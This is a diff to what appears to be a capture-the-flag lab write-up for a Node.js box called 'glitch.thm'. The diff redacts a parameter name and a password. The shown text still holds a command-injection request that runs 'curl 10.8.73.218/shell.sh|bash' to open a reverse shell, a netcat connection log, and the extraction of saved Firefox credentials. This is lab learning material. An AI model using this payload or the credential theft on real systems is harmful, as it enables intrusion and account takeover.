@@ -135,12 +135,11 @@ Filtered Requests: 4613
 Requests/sec.: 59.00176
 
 
-GOT 'cmd' AS A PARAMETER
 AS THIS SERVER IS A NODE.JS SERVER SO WE HAVE TO CHECK HOW TO CREATE A REVERSE SHELL IN IT
 
 USING BURPSUIT:
 REQUEST:
-http://<ip>/api/items?cmd=require("child_process").exec("curl 10.8.73.218/shell.sh|bash")
+http://<ip>/api/items?REDACTED=require("child_process").exec("curl 10.8.73.218/shell.sh|bash")
 
 (ADD THE NETCAT REVERSE SHELL IN THE SHELL.SH FILE FIRST)
 
@@ -202,7 +201,7 @@ connect to [10.8.73.218] from (UNKNOWN) [10.10.66.189] 42802
 ca44f6a4cca2da18fc273b2206406bf8  firefox.tar.gz
 
 
-AS MD5 ARE SAME WHICH MEANS FILE TRANSFERED PROPERLY
+AS MD5 ARE SAME WHICH MEANS FILE TRANSFERRED PROPERLY
 
 
 NOW USING THE FIREFOX EXTRACTER (WHICH I DOWNLOADED FROM GITHUB)
@@ -219,7 +218,7 @@ Master Password for profile .firefox/b5w4643p.default-release:
 
 Website:   https://glitch.thm
 Username: 'v0id'
-Password: 'love_the_void'
+Password: 'REDACTED'
 
 GOT THE PASSWORD FOR THE ANOTHER USER 'v0id'
 
